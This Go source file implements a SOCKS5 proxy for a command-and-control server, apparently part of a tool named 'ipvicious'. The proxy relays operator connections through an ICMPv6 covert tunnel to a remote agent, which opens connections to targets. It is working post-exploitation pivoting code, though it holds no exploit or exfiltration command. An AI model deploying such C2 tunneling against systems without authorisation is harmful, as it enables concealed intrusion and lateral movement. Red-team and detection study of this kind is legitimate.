//go:build linux

// Package socks5 implements a SOCKS5 proxy (RFC 1928) on the C2 server.
// Only the CONNECT command with NO_AUTH (method 0x00) is supported.
// When a CONNECT request arrives the proxy allocates a tunnel stream,
// sends TypeStreamOpen to the agent, then bidirectionally relays bytes between
// the SOCKS5 TCP socket and the tunnel stream.
package socks5

import (
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"net"

	"ipvicious/internal/protocol"
	"ipvicious/internal/tunnel"
)

// Proxy is a SOCKS5 server bound to a specific agent.
type Proxy struct {
	agent    *tunnel.AgentEntry
	listener net.Listener
}

// New creates a Proxy that relays connections through agent's ICMPv6 tunnel.
func New(agent *tunnel.AgentEntry) *Proxy {
	return &Proxy{agent: agent}
}

// Listen starts accepting SOCKS5 connections on addr (e.g. "127.0.0.1:1080").
func (p *Proxy) Listen(addr string) error {
	l, err := net.Listen("tcp", addr)
	if err != nil {
		return fmt.Errorf("socks5 listen %s: %w", addr, err)
	}
	p.listener = l
	log.Printf("[socks5] listening on %s", addr)
	go p.acceptLoop()
	return nil
}

// Close shuts down the listener.
func (p *Proxy) Close() {
	if p.listener != nil {
		p.listener.Close()
	}
}

// Addr returns the address the SOCKS5 listener is bound to, or "" if not listening.
func (p *Proxy) Addr() string {
	if p.listener == nil {
		return ""
	}
	return p.listener.Addr().String()
}

// acceptLoop continuously accepts incoming SOCKS5 connections.
func (p *Proxy) acceptLoop() {
	for {
		conn, err := p.listener.Accept()
		if err != nil {
			return
		}
		go p.handleConn(conn)
	}
}

// handleConn wraps negotiate with error logging.
func (p *Proxy) handleConn(conn net.Conn) {
	if err := p.negotiate(conn); err != nil {
		log.Printf("[socks5] session error: %v", err)
		conn.Close()
	}
}

// negotiate performs the full SOCKS5 handshake (RFC 1928) and then relays
// the connection through the ICMPv6 tunnel to the agent.
func (p *Proxy) negotiate(conn net.Conn) error {
	// ── Phase 1: method negotiation ─────────────────────────────────────────
	hdr := make([]byte, 2)
	if _, err := io.ReadFull(conn, hdr); err != nil {
		return fmt.Errorf("read method header: %w", err)
	}
	if hdr[0] != 5 {
		return fmt.Errorf("socks version %d not supported", hdr[0])
	}
	methods := make([]byte, int(hdr[1]))
	if _, err := io.ReadFull(conn, methods); err != nil {
		return fmt.Errorf("read methods: %w", err)
	}
	// Require NO_AUTH (0x00)
	noAuth := false
	for _, m := range methods {
		if m == 0x00 {
			noAuth = true
			break
		}
	}
	if !noAuth {
		conn.Write([]byte{0x05, 0xFF}) // no acceptable method; connection will be closed
		return fmt.Errorf("no acceptable auth method from %v", conn.RemoteAddr())
	}
	if _, err := conn.Write([]byte{0x05, 0x00}); err != nil { // select NO_AUTH
		return fmt.Errorf("send NO_AUTH: %w", err)
	}

	// ── Phase 2: connection request ──────────────────────────────────────────
	reqHdr := make([]byte, 4) // VER CMD RSV ATYP
	if _, err := io.ReadFull(conn, reqHdr); err != nil {
		return fmt.Errorf("read request header: %w", err)
	}
	if reqHdr[1] != 0x01 { // only CONNECT is supported
		socks5Reply(conn, 0x07)
		return fmt.Errorf("command 0x%02x not supported", reqHdr[1])
	}

	atyp := reqHdr[3]
	var rawAddr []byte
	var protoAtyp byte

	switch atyp {
	case 0x01: // IPv4 (4 bytes)
		rawAddr = make([]byte, 4)
		if _, err := io.ReadFull(conn, rawAddr); err != nil {
			return fmt.Errorf("read IPv4: %w", err)
		}
		protoAtyp = protocol.AddrIPv4

	case 0x04: // IPv6 (16 bytes)
		rawAddr = make([]byte, 16)
		if _, err := io.ReadFull(conn, rawAddr); err != nil {
			return fmt.Errorf("read IPv6: %w", err)
		}
		protoAtyp = protocol.AddrIPv6

	case 0x03: // Domain name (1-byte length prefix + name)
		lenBuf := make([]byte, 1)
		if _, err := io.ReadFull(conn, lenBuf); err != nil {
			return fmt.Errorf("read domain length: %w", err)
		}
		rawAddr = make([]byte, int(lenBuf[0]))
		if _, err := io.ReadFull(conn, rawAddr); err != nil {
			return fmt.Errorf("read domain: %w", err)
		}
		protoAtyp = protocol.AddrDomain

	default:
		socks5Reply(conn, 0x08) // address type not supported
		return fmt.Errorf("address type 0x%02x not supported", atyp)
	}

	portBuf := make([]byte, 2)
	if _, err := io.ReadFull(conn, portBuf); err != nil {
		return fmt.Errorf("read port: %w", err)
	}
	port := binary.BigEndian.Uint16(portBuf)

	// ── Phase 3: open tunnel stream ───────────────────────────────────────────
	// Allocate a stream ID and instruct the agent to connect to the target.
	s := p.agent.Streams().Alloc()
	p.agent.OpenStream(s.ID, protoAtyp, rawAddr, port)

	// Send SOCKS5 success reply (bound to 0.0.0.0:0 — we don't bind locally)
	socks5Reply(conn, 0x00)
	log.Printf("[socks5] stream %d opened → port %d", s.ID, port)

	defer func() {
		s.Close()
		p.agent.Streams().Remove(s.ID)
		p.agent.CloseStream(s.ID)
		conn.Close()
		log.Printf("[socks5] stream %d closed", s.ID)
	}()

	// ── Phase 4: bidirectional relay ─────────────────────────────────────────

	// SOCKS5 client → tunnel stream → agent
	go func() {
		buf := make([]byte, protocol.MaxData)
		for {
			n, err := conn.Read(buf)
			if n > 0 {
				chunk := make([]byte, n)
				copy(chunk, buf[:n])
				p.agent.Enqueue(&protocol.Frame{
					Type:     protocol.TypeData,
					StreamID: s.ID,
					Data:     chunk,
				})
			}
			if err != nil {
				s.Close()
				return
			}
			if s.IsClosed() {
				return
			}
		}
	}()

	// agent → tunnel stream → SOCKS5 client
	for {
		select {
		case <-s.Closed:
			return nil
		case data := <-s.RecvBuf:
			if _, err := conn.Write(data); err != nil {
				return fmt.Errorf("write to socks5 client: %w", err)
			}
		}
	}
}

// socks5Reply sends a SOCKS5 reply frame with the given reply code.
// The bound address is always 0.0.0.0:0 (we do not bind locally).
func socks5Reply(conn net.Conn, rep byte) {
	// VER(1) REP(1) RSV(1) ATYP(1=IPv4) BND.ADDR(4) BND.PORT(2)
	conn.Write([]byte{0x05, rep, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
}
